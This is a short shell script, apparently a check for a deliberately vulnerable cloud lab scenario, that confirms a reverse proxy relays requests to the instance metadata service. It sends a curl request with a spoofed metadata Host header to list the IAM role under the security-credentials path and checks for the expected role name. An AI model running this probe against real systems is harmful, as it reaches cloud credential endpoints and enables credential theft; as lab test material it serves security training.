#!/bin/sh
# The scenario's reverse proxy answers and relays a request to the instance metadata service (the
# vulnerability): it lists the instance profile's role.
set -eu
r=$(curl -fsS -m 10 -H 'Host: 169.254.169.254' "http://$ISOLOOM_OUTPUT_TARGET_IP/latest/meta-data/iam/security-credentials/")
case "$r" in *cg-banking-WAF-Role*) ;; *) echo "unexpected answer: $r" >&2; exit 1 ;; esac
